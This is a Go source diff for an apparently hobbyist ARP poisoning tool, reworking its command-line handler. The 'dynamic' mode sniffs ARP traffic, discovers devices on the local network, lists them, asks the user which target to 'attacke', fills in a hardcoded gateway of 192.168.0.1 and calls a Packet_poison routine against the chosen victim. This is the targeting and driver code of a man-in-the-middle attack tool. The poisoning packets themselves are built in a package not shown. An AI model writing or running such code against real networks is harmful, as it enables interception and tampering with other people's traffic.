@@ -2,7 +2,7 @@ package commandlinehandle
 
 import (
 	"arp_poision/captureArp"
-	"arp_poision/utilites"
+	"arp_poision/shared"
 	"fmt"
 	"log"
 	"net"
@@ -22,12 +22,6 @@ type CommandLineArgs struct {
 	DefaultGateway string
 }
 
-type ParsedCommandLine struct {
-	AttackerMAC    net.HardwareAddr
-	VictimMAC      net.HardwareAddr
-	VictimIP       net.IP
-	DefaultGateway net.IP
-}
 
 
 
@@ -91,45 +85,77 @@ func checkStatic(args []string) {
 	CommandLineArgsGen(user_command);
 }
 
-func checkDynamic(handler *pcap.Handle ) {
+func checkDynamic(handler *pcap.Handle , iface net.Interface) {
 	var user_command CommandLineArgs;
 	var targets []*captureArp.Target;
 
 	ch := make(chan string);
 
-	iface := utilites.Display_interfaces();
 	addr , err := iface.Addrs();
 	if err != nil {
 		log.Fatal("Error finding device IP");
 	}
 	user_command.AttackerIP = addr[0].String()
 	user_command.AttackerMAC = iface.HardwareAddr.String()
+	println(user_command.AttackerIP);
 
 	// Then we want to discover devices inorder to fill up the rest
 
+	atp := addr[0].(*net.IPNet);
 
 	var wg sync.WaitGroup
 	wg.Add(2)
 
 	go func() {
 		defer wg.Done()
-		captureArp.Sniff_arp(net.IP(user_command.AttackerIP).To4(), ch, &targets)
+		captureArp.Sniff_arp(atp.IP.To4(), ch, &targets)
 	}()
 
-	time.Sleep(5 * time.Second);
+	time.Sleep(3 * time.Second);
 	go func(){
 		defer wg.Done()
-		captureArp.Discover_devices(handler, args, args.DefaultGateway, ch);
+		captureArp.Discover_devices(handler,iface.HardwareAddr , atp.IP.To4(), ch);
 	}()
-
 	wg.Wait()
+	target_index := print_targets(targets);
+
+	user_command.DefaultGateway = "192.168.0.1";
+	user_command.VictimMAC = targets[target_index].TargetMac.String();
+	user_command.VictimIP = targets[target_index].TargetIp.String();
+
+	fmt.Println("User command Structure look like this ", user_command);
+
+	something := CommandLineArgsGen(user_command);
+
+	fmt.Println("User command after parsing ", something);
+	captureArp.Packet_poison(handler, something)
+
 
 
 }
 
-func CommandLineChecker(args []string, handler *pcap.Handle) {
+func print_targets (targets []*captureArp.Target) int {
+	if len(targets) == 0 {
+		log.Fatal("No device detected");
+	}
+	var target_index int;
+	fmt.Println("Targets Found 🖥️");
+	for i, target := range targets {
+		fmt.Printf("Target ID: %d\n", i);
+		fmt.Printf("Target IP : %s\n", target.TargetIp.String() );
+		fmt.Printf("Target MAC: %s\n", target.TargetMac.String());
+		println("--------------------------------------------");
+	}
+	fmt.Printf("Enter the target ID u want to attacke: ");
+	fmt.Scanln(&target_index);
+	return target_index;
 
-	help_menu(args[0]);
+
+	
+}
+
+func CommandLineChecker(args []string, handler *pcap.Handle, iface net.Interface) {
+
 
 	if args[1] != "dynamic" && args[1] != "static" {
 		help_menu(args[0]);
@@ -142,15 +168,16 @@ func CommandLineChecker(args []string, handler *pcap.Handle) {
 		checkStatic(args[2:])
 
 	case "dynamic":
-		checkDynamic(handler);
+		checkDynamic(handler, iface);
 	default:
 		help_menu(args[0])
 		os.Exit(1);
 	}
 
 }
-func CommandLineArgsGen(args CommandLineArgs) ParsedCommandLine {
-	var parsed ParsedCommandLine
+func CommandLineArgsGen(args CommandLineArgs) shared.ParsedCommandLine {
+	var parsed shared.ParsedCommandLine
+
 
 
 	fmt.Printf("[+] Parsed: %+v\n", args)
